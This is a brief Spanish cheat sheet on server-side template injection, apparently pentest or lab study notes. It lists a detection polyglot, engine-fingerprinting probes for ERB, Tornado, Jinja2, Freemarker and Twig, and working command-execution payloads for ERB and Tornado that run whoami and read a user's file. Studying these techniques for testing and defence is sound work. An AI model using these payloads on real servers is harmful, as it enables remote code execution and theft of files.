---
tags:
  - Chuletas
---
# SSTI (Server-Side Template Injection)

## Detección
- Payload que fuerza error en casi cualquier motor: `${{<%[%'"}}%`
- Probar en funcionalidades que reflejan texto (fuera del valor esperado)

## Identificar el motor
| Motor | Prueba | Resultado |
|---|---|---|
| ERB (Ruby) | `<%= 7*7 %>` | `49` |
| Tornado (Python) | `{{7*7}}` | `49` |
| Jinja2 (Python) | `{{7*7}}` | `49` |
| Freemarker (Java) | `${7*7}` | `49` |
| Twig (PHP) | `{{7*7}}` | `49` |

## Ejecución de comandos
- **ERB:** `<%= system('whoami') %>` · `<%= system('cat /home/carlos/....txt') %>`
- **Tornado:** romper contexto y usar `os`:
  ```
  user.name}}{%import os%}{{os.system('whoami')}}
  ```
- Ir del `{{7*7}}` a lectura de ficheros / RCE según el motor detectado.
